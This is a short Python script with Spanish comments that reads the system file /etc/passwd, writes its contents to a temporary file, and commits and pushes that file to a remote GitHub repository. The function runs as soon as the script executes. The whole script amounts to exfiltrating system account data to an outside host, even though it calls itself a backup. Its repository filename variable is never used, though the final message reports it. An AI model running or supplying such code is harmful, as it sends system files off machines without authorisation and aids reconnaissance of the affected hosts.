import subprocess

def run():
    # Ruta al archivo /etc/passwd
    ruta_passwd = '/etc/passwd'

    # Mensaje de commit para el cambio
    mensaje_commit = 'Agregar /etc/passwd a GitHub'

    # Nombre del archivo en el repositorio
    archivo_en_repo = 'passwd_backup.txt'

    # Lee el contenido del archivo /etc/passwd
    with open(ruta_passwd, 'r') as file:
        contenido = file.read()

    # Guarda el contenido en un archivo temporal
    with open('temp_passwd_backup.txt', 'w') as temp_file:
        temp_file.write(contenido)

    # Añade y sube el archivo al repositorio de GitHub
    subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])
    subprocess.run(['git', 'commit', '-m', mensaje_commit])
    subprocess.run(['git', 'push', 'origin', 'master'])  # Empuja al repositorio remoto, ajusta 'master' si es necesario

    print(f'Archivo {ruta_passwd} copiado a GitHub en el repositorio {archivo_en_repo}')

# Llamamos a la función run()
run()
